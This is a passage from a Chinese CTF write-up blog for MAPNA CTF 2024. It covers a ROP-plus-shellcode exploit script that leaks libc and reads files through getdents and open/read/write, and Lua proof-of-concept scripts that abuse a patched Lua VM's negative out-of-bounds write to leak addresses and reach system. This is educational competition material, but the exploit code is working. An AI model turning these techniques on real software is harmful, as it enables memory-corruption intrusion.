src=\"/2024/07/16/2024_mapna_CTF/026aab2e2ea12ad1e327ec1349680936.png\" alt=\"026aab2e2ea12ad1e327ec1349680936\"></p>\n<p>出题人也留了 getdents 系统调用用来读取文件夹下的目录，可以用 mprotect ，直接用 shellcode 更加方便，直接让 gpt 写一个例子</p>\n<p>poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#include &lt;stdio.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;unistd.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;fcntl.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;sys/syscall.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;errno.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#include &lt;stdint.h&gt;  // For uint64_t and int64_t</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#define BUF_SIZE 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\">typedef uint64_t u64;</span><br><span class=\"line\">typedef int64_t s64;</span><br><span class=\"line\"></span><br><span class=\"line\">struct mylkm_linux_dirent &#123;</span><br><span class=\"line\">    u64            d_ino;</span><br><span class=\"line\">    s64            d_off;</span><br><span class=\"line\">    unsigned short d_reclen;</span><br><span class=\"line\">    char           d_name[];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> main() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> fd;</span><br><span class=\"line\">    ssize_t nread;</span><br><span class=\"line\">    char buf[BUF_SIZE];</span><br><span class=\"line\"></span><br><span class=\"line\">    fd = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./maze&quot;</span>, O_RDONLY | O_DIRECTORY);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fd == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((nread = syscall(SYS_getdents, fd, (struct mylkm_linux_dirent *)buf, BUF_SIZE)) &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> bpos = <span class=\"number\">0</span>; bpos &lt; nread;) &#123;</span><br><span class=\"line\">            struct mylkm_linux_dirent *d = (struct mylkm_linux_dirent *)(buf + bpos);</span><br><span class=\"line\">            printf(<span class=\"string\">&quot;%s\\n&quot;</span>, d-&gt;d_name);</span><br><span class=\"line\">            bpos += d-&gt;d_reclen;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nread == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;getdents&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    close(fd);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里显然需要知道 d_name 和 d_reclen 的偏移是多少，才能搓汇编</p>\n<p>IDA 直接反汇编</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/a71807dfc724c70db8cd5776cb3e60b9.png\" alt=\"a71807dfc724c70db8cd5776cb3e60b9\"></p>\n<p>可以看到， bpos + 0x12 是文件名，bpos + 0x10 是下个文件结构体的基址，于是根据这个信息就可以手搓汇编了，先写出遍历所有文件的 shellcode，再补充 orw 进去。</p>\n<p>需要注意的是，getdents 要读 0x100 个文件的信息，所以我把信息保存到 libc_base + 0x21c000 中</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_rdi_ret</span>(<span class=\"params\">rop, base</span>) : <span class=\"keyword\">return</span> base + rop.find_gadget([<span class=\"string\">&#x27;pop rdi&#x27;</span>, <span class=\"string\">&#x27;ret&#x27;</span>]).address, base + rop.find_gadget([<span class=\"string\">&#x27;ret&#x27;</span>]).address</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>)<span class=\"comment\">#, log_level=&#x27;debug&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./chall&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">elf_rop = ROP(elf_patch)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_patch = <span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(libc_patch):</span><br><span class=\"line\">\tlibc = ELF(libc_patch)</span><br><span class=\"line\">\tlibc_rop = ROP(libc_patch)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ld = ELF(&#x27;./lib/ld-linux-x86-64.so.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *0x000000000040116c&#x27;)\t</span></span><br><span class=\"line\"></span><br><span class=\"line\">rdi_rsi_rdx = <span class=\"number\">0x00000000004014d9</span></span><br><span class=\"line\">ret = <span class=\"number\">0x000000000040101a</span></span><br><span class=\"line\">rbp = <span class=\"number\">0x00000000004011dd</span></span><br><span class=\"line\">leave = <span class=\"number\">0x000000000040148c</span></span><br><span class=\"line\"></span><br><span class=\"line\">buf = elf.bss() + <span class=\"number\">0x300</span></span><br><span class=\"line\"></span><br><span class=\"line\">pl = p64(buf) + p64(ret) + p64(rdi_rsi_rdx) + p64(elf.got[<span class=\"string\">&#x27;printf&#x27;</span>]) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(elf.sym[<span class=\"string\">&#x27;printf&#x27;</span>]) + p64(rdi_rsi_rdx) + p64(<span class=\"number\">0</span>) + p64(buf) + p64(<span class=\"number\">0x1000</span>) + p64(elf.sym[<span class=\"string\">&#x27;read&#x27;</span>]) + p64(leave)</span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Input: &#x27;</span>, <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span> + pl)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = u64(r(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)) - libc.sym[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">mprotect = libc_base + libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]</span><br><span class=\"line\">rax = libc_base + <span class=\"number\">0x0000000000045eb0</span></span><br><span class=\"line\">jmp_rax = <span class=\"number\">0x000000000040116c</span></span><br><span class=\"line\"></span><br><span class=\"line\">pl = p64(<span class=\"number\">0</span>) + p64(rdi_rsi_rdx) + p64(<span class=\"number\">0x404000</span>) + p64(<span class=\"number\">0x3000</span>) + p64(<span class=\"number\">7</span>) + p64(mprotect) + p64(rax) + p64(buf + <span class=\"number\">0x48</span>) + p64(jmp_rax)</span><br><span class=\"line\"></span><br><span class=\"line\">maze = libc_base + <span class=\"number\">0x21c000</span></span><br><span class=\"line\"></span><br><span class=\"line\">sc = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./maze&#x27;</span>) + shellcraft.getdents(<span class=\"number\">3</span>, maze, <span class=\"number\">0x10000</span>)</span><br><span class=\"line\">sc += <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">mov rsp, r12;</span></span><br><span class=\"line\"><span class=\"string\">mov r10, rsi;</span></span><br><span class=\"line\"><span class=\"string\">xor r11, r11;</span></span><br><span class=\"line\"><span class=\"string\">mov [rsp], r11;</span></span><br><span class=\"line\"><span class=\"string\">mov r9, 0x2f657a616d2f2e00;</span></span><br><span class=\"line\"><span class=\"string\">orw:</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, r10;</span></span><br><span class=\"line\"><span class=\"string\">\tadd rdi, [rsp];</span></span><br><span class=\"line\"><span class=\"string\">\tadd rdi, 0x12;</span></span><br><span class=\"line\"><span class=\"string\">\tmov r8, rdi;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tsub rdi, 2;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, [rdi];\t</span></span><br><span class=\"line\"><span class=\"string\">\tand rdi, 0xffff;</span></span><br><span class=\"line\"><span class=\"string\">\tadd [rsp], rdi;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, r8;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tsub rdi, 8;</span></span><br><span class=\"line\"><span class=\"string\">\tmov [rdi], r9;</span></span><br><span class=\"line\"><span class=\"string\">\tadd rdi, 1;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tmov eax, 2;</span></span><br><span class=\"line\"><span class=\"string\">\txor rsi, rsi;</span></span><br><span class=\"line\"><span class=\"string\">\txor rdx, rdx;</span></span><br><span class=\"line\"><span class=\"string\">\tsyscall</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tpush rax;</span></span><br><span class=\"line\"><span class=\"string\">\tpop rdi;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rsi, 0x404090;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdx, 0x50;</span></span><br><span class=\"line\"><span class=\"string\">\tmov eax, 0;</span></span><br><span class=\"line\"><span class=\"string\">\tsyscall;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tmov rdi, 1;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rax, 1;</span></span><br><span class=\"line\"><span class=\"string\">\tsyscall;</span></span><br><span class=\"line\"><span class=\"string\">\t</span></span><br><span class=\"line\"><span class=\"string\">\tjmp orw;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pl += asm(sc)</span><br><span class=\"line\"></span><br><span class=\"line\">s(pl)</span><br><span class=\"line\"></span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;MAPNA&#x27;</span>)</span><br><span class=\"line\">pr()</span><br><span class=\"line\">pause()\t</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"u2s-偏难\"><a href=\"#u2s-偏难\" class=\"headerlink\" title=\"u2s 偏难\"></a>u2s 偏难</h2><p>这道题偏难的原因是该题是一个 c 语言实现的 lua 虚拟机，如果不熟悉 lua 语言会比较难做。</p>\n<p>题目给了 diff 文件，其中重点关注的是</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff <span class=\"comment\">--git a/src/lvm.h b/src/lvm.h</span></span><br><span class=\"line\">index dba1ad2.<span class=\"number\">.485</span>b5aa <span class=\"number\">100644</span></span><br><span class=\"line\"><span class=\"comment\">--- a/src/lvm.h</span></span><br><span class=\"line\">+++ b/src/lvm.h</span><br><span class=\"line\">@@ <span class=\"number\">-96</span>,<span class=\"number\">7</span> +<span class=\"number\">96</span>,<span class=\"number\">7</span> @@ typedef enum &#123;</span><br><span class=\"line\"> #define luaV_fastgeti(L,t,k,slot) \\</span><br><span class=\"line\">   (!ttistable(t)  \\</span><br><span class=\"line\">    ? (slot = NULL, <span class=\"number\">0</span>)  /* <span class=\"keyword\">not</span> a <span class=\"built_in\">table</span>; <span class=\"string\">&#x27;slot&#x27;</span> is NULL <span class=\"keyword\">and</span> result is <span class=\"number\">0</span> */  \\</span><br><span class=\"line\">-   : (slot = (l_castS2U(k) - <span class=\"number\">1</span>u &lt; hvalue(t)-&gt;alimit) \\</span><br><span class=\"line\">+   : (slot = (l_castU2S(k) - <span class=\"number\">1</span>u &lt; hvalue(t)-&gt;alimit) \\</span><br><span class=\"line\">               ? &amp;hvalue(t)-&gt;array[k - <span class=\"number\">1</span>] : luaH_getint(hvalue(t), k), \\</span><br><span class=\"line\">       !isempty(slot)))  /* result <span class=\"keyword\">not</span> empty? */</span><br></pre></td></tr></table></figure>\n\n<p>luaV_fastgeti 定义在查阅资料后发现是用于获取 Lua 表（table）中整数键（integer keys）对应的值，那么说明这个 patch 会导致 oob，还有其它 patch 是限制了读文件、命令执行等，就不详细说。</p>\n<p>一开始做这个题目，想着用下面的 poc</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = &#123;<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> ,<span class=\"number\">4</span> ,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ptr_a[<span class=\"number\">-1</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ptr_a[<span class=\"number\">7</span>])</span><br></pre></td></tr></table></figure>\n\n<p>结果读出来的都是 nil，就比较怀疑是不是 oob 了</p>\n<p>接着测试下面的 poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local ptr_a = &#123;&quot;stopstop&quot;, 2, 3 ,4 ,5&#125;</span><br><span class=\"line\">print(ptr_a[1])</span><br></pre></td></tr></table></figure>\n\n<p>通过打断点到 write </p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/325cb2be0d46af5dfa4e554f694f5653.png\" alt=\"325cb2be0d46af5dfa4e554f694f5653\"></p>\n<p>可以直接跑到 print 函数的底层 write 处，通过栈回溯</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/2995cb6424e5ad1909e50a60c5d2d3fb.png\" alt=\"2995cb6424e5ad1909e50a60c5d2d3fb\"></p>\n<p>可以判断出 luaB_print 是用来输出数组元素的</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/412ba4989eb7b2d59e91b7902ee90dc0.png\" alt=\"412ba4989eb7b2d59e91b7902ee90dc0\"></p>\n<p>其中的 luaL_tolstring 函数就是用来在列表中找值的，不过直接调试，发现 luaL_tolstring  是没有越界的。</p>\n<p>接着测试和数组相关的代码，继续调试的话，会发现</p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = &#123;<span class=\"number\">0x11223344</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> ,<span class=\"number\">4</span> ,<span class=\"number\">5</span>, <span class=\"number\">6</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ptr_a[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_a[<span class=\"number\">-5</span>] = <span class=\"number\">0xaabbccdd</span></span><br></pre></td></tr></table></figure>\n\n<p>上面的 poc 存在负向溢出写</p>\n<p>调试 gdb 配置如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set args ./poc</span><br><span class=\"line\">start</span><br><span class=\"line\">b luaB_print</span><br><span class=\"line\">b exit</span><br><span class=\"line\">c</span><br></pre></td></tr></table></figure>\n\n<p>这样就可以在进入 luaB_print 和 exit 时候各看一次数组的变化，来判断出存在什么漏洞</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/9c57c3fa3ea70c1d909dcb8bab284400.png\" alt=\"9c57c3fa3ea70c1d909dcb8bab284400\"></p>\n<p>直接数据搜索可以看到列表是存在于堆块上的，接下来继续走会 crash</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/0752fdb4b1d40ad324d14d420a58f538.png\" alt=\"0752fdb4b1d40ad324d14d420a58f538\"></p>\n<p>并且被写上去了，所以到这里就确定漏洞是数组的负向溢出写</p>\n<p>由于一些功能被禁用了，所以没有办法直接泄露出地址，如果要通过堆，那么就需要一个稳定的堆布局</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/fb3567e5c69c41e00a0ed78f798e3216.png\" alt=\"fb3567e5c69c41e00a0ed78f798e3216\"></p>\n<p>需要把堆都申请下，这里如果调试会发现，字符串也是放在堆块上的，并且申请的堆块大小是 字符串大小 + 0x28</p>\n<p>有了稳定的堆布局之后，就可以进行堆地址泄露</p>\n<p><img src=\"/2024/07/16/2024_mapna_CTF/9179f62fdb0d1122acfe5bc90a4e8e96.png\"></p>\n<figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">local</span> ptr_a = <span class=\"built_in\">string</span>.<span class=\"built_in\">rep</span>(<span class=\"string\">&#x27;e&#x27;</span>, <span class=\"number\">0x100</span>)</span><br><span class=\"line\"><span class=\"keyword\">local</span> ptr_b = &#123;<span class=\"number\">0x11223344</span>, <span class=\"number\">0x2</span>, <span class=\"number\">0x3</span>, <span class=\"number\">0x4</span>, <span class=\"number\">0x5</span>, <span class=\"number\">0x6</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_b[<span class=\"number\">-10</span>] = <span class=\"built_in\">print</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">local</span> pro_base = u64(<span class=\"built_in\">string</span>.<span class=\"built_in\">sub</span>(ptr_a, <span class=\"number\">0x68</span>, <span class=\"number\">0x80</span>)) - <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;pro_base -&gt; &quot;</span>, intToHex(pro_base))</span><br><span class=\"line\"><span class=\"keyword\">local</span> ste = pro_base + <span class=\"number\">0x3a2dd</span></span><br><span class=\"line\"><span class=\"keyword\">local</span> pr = pro_base + <span class=\"number\">0x376d4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system -&gt; &quot;</span>, intToHex(ste))</span><br></pre></td></tr></table></figure>\n\n<p>我一开始用两个列表，但是 print 时候一直报错</p>\n<p>这样就获得了程序基址，接着就可以直接调用了</p>\n<p>这是一个直接调用的 poc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local ptr_a = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ptr_a[<span class=\"number\">1</span>] = <span class=\"built_in\">print</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">2</span>] = <span class=\"number\">0x11223344</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">3</span>] = <span class=\"number\">3</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">4</span>] = <span class=\"number\">4</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">5</span>] = <span class=\"number\">5</span></span><br><span class=\"line\">ptr_a[<span class=\"number\">6</span>] = <span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\">(ptr_a[<span class=\"number\">1</span>])(ptr_a[<span class=\"number\">2</span>])</span><br></pre></td></tr></table></figure>\n\n<p>由于某些功能被禁用了，所以要调用 system 的话，得通过负向溢出调用伪造的数组</p>\n<p><img 